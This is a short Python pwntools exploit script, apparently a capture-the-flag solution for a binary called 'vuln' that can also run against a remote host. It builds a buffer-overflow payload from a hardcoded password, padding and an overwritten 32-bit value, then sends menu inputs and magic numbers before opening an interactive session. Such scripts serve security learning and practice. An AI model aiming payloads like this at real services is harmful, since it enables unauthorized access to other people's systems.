#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or "vuln")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

io = start()

payload = b"s3cr3tpass\x00"
payload += b"A" * (44 - len(payload))
payload += p32(0x79656B)

io.sendline(b"2")
io.sendline(b"AAAA")
io.sendline(payload)
io.sendline(b"69")
io.sendline(b"3735991189")

io.interactive()
